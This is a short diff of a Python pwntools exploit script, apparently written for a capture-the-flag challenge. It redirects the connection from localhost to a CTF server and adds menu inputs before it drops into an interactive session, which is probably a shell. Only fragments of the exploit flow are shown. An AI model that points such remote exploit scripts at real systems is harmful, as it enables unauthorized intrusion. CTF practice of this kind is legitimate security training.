@@ -2,8 +2,8 @@ from pwn import *
 from time import sleep
 context.arch = 'amd64'
 
-#r = remote('csie.ctf.tw',10137)
-r = remote('localhost',8888)
+r = remote('csie.ctf.tw',10137)
+#r = remote('localhost',8888)
 
 #r.interactive()
 size = '64'
@@ -42,6 +42,8 @@ r.send(p64(magic))
 sleep(0.01)
 #
 r.send('3')
+sleep(0.01)
+r.send('0')
 sleep(0.01)
 
 r.interactive()
